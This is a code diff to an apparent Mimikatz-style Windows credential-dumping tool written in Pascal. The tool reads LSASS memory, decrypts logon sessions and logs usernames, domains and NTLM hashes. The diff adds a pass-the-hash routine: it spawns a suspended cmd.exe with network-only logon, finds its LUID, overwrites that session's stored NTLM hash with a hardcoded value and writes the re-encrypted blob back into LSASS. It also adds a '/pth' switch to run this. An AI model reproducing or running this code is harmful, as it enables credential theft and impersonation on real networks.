@@ -32,8 +32,8 @@ end;
        usernameoff:word;
        unk4:array[0..5] of byte;
        //+32
-       ntlmhash:array[0..15] of byte;
-       lmhash:array[0..15] of byte;
+       ntlmhash:tbyte16; //array[0..15] of byte;
+       lmhash:tbyte16; //array[0..15] of byte;
        //+64
        //sha1
        //domain
@@ -533,7 +533,7 @@ begin
 end;
 
 //check kuhl_m_sekurlsa_utils.c
-function logonpasswords(pid:dword;module:string):boolean;
+function logonpasswords(pid:dword;module:string;luid:int64=0):boolean;
 const
   //dd Lsasrv!LogonSessionList in windbg
   PTRN_WN1803_LogonSessionList:array [0..11] of byte= ($33, $ff, $41, $89, $37, $4c, $8b, $f3, $45, $85, $c9, $74);
@@ -562,7 +562,7 @@ var
   pattern:array of byte;
   logsesslist:array [0..sizeof(_KIWI_MSV1_0_LIST_63)-1] of byte;
   bytes:array[0..1023] of byte;
-  password,decrypted:tbytes;
+  password,decrypted,output:tbytes;
   username,domain:array [0..254] of widechar;
   credentials,ptr,first:nativeuint;
   CREDENTIALW:_CREDENTIALW;
@@ -672,6 +672,8 @@ begin
                                    while _KIWI_MSV1_0_LIST_63 (logsesslist ).flink<>offset do
                                    begin
                                    //log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
+                                   if (luid=0) or (luid=_KIWI_MSV1_0_LIST_63 (logsesslist ).LocallyUniqueIdentifier.lowPart) then
+                                   begin
                                    log('**************************************************',1);
                                    log('entry#next:'+dummy,0) ;
 
@@ -692,10 +694,10 @@ begin
                                    if copy(winver,1,3)='6.1'
                                       then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).CredentialManager)
                                       else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).CredentialManager);
-                                   log('->CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
                                    first:=0;
                                    if Credentials<>0 then
                                      begin
+                                     log('->CredentialManager:'+inttohex(credentials,sizeof(pvoid)),1);
                                      //CredentialManager
                                      ReadMem  (hprocess,credentials,bytes);
                                      log(inttohex(Pgeneric_list (@bytes[0]).unk4  ,sizeof(nativeuint)),0);
@@ -743,9 +745,9 @@ begin
                                    if copy(winver,1,3)='6.1'
                                       then credentials:=nativeuint(PKIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ  (@logsesslist[0] ).Credentials)
                                       else credentials:=nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials);
-                                   log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
                                    if Credentials<>0 then
                                      begin
+                                     log('CredentialsPtr:'+inttohex(credentials,sizeof(pointer))) ;
                                      ReadMem  (hprocess,credentials,bytes );
                                      //we should loop thru credentials...
                                      //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
@@ -780,6 +782,13 @@ begin
                                                           log('domain:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).domainoff]),1);
                                                           log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                                           log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
+                                                          //below is only a test to see if we can re encrypt for PTH
+                                                          if luid<>0 then
+                                                          begin
+                                                          PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash:=HexaStringToByte('87DBA060EB4C302729C00E631A42E6CD');
+                                                          encryptLSA(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,decrypted,output);
+                                                          writemem(hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),output);
+                                                          end;//if luid<>0 then
                                                           end;
                                                        if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14 then
                                                           begin
@@ -792,6 +801,7 @@ begin
                                      ReadMem  (hprocess,credentials,bytes );
                                      end; //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
                                      end;//if nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials)<>0 then
+                                     end; // if (luid=0) or ...
                                    //next logsesslist
                                    ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
                                    dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
@@ -1063,11 +1073,46 @@ begin
 end;
 
 function pth:boolean;
+const
+  LOGON_WITH_PROFILE=1;
+  LOGON_NETCREDENTIALS_ONLY=2;
+  //
+  CREATE_NEW_CONSOLE=$10;
+  CREATE_SUSPENDED=$4;
+
+var
+si           : TStartupInfoW;
+pi          : TProcessInformation;
+bret:bool;
+token:thandle;
+len:dword;
+stats:TOKEN_STATISTICS ;
 begin
   //createprocesswithlogon suspended
+  ZeroMemory(@si, sizeof(si));
+  ZeroMemory(@pi, sizeof(pi));
+  si.cb := sizeof(si);
+  si.dwFlags := STARTF_USESHOWWINDOW;
+  si.wShowWindow := 1;
+  bret:=CreateProcessWithLogonW(pwidechar('admin'),pwidechar('.'),pwidechar(''),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar('c:\windows\system32\cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
+  if bret=false then writeln('failed: '+inttostr(getlasterror));
   //OpenProcessToken / GetTokenInformation +tokenstatistics to get LogonSession LUID
+  if bret=true then
+     begin
+     fillchar(stats,sizeof(stats),0);
+     if OpenProcesstoken(pi.hProcess ,TOKEN_READ,token)= true
+        then if GetTokenInformation(token,tokenstatistics,@stats,sizeof(stats),len)
+           then writeln('LUID:'+inttohex(stats.AuthenticationId,sizeof(stats.AuthenticationId)));
+     writeln(pi.dwProcessId );
+     //closehandle(pi.hProcess );
+     findlsakeys (lsass_pid,deskey,aeskey,iv );
+     logonpasswords (lsass_pid ,'lsasrv.dll',stats.AuthenticationId);
+     //_killproc(pi.dwProcessId); //temp
+     end;
+
+
   //cycle thru logonsessions to match the luid
-  //patch the structure to stuff the ntlm hash (encrypted)
+  //patch the credentialblob to stuff the ntlm hash (encrypted with encryptlsa)
 end;
 
 begin
@@ -1152,8 +1197,13 @@ begin
   }
   //exit;
   //
+  p:=pos('/pth',cmdline);
+  if p>0 then
+   begin
+   pth;
+   end;
   p:=pos('/enumcred2',cmdline);
-if p>0 then
+  if p>0 then
    begin
    //uvaults.VaultInit ;
    uvaults.patch (lsass_pid ); //calling enumvault seems to bring back an encrypted blob
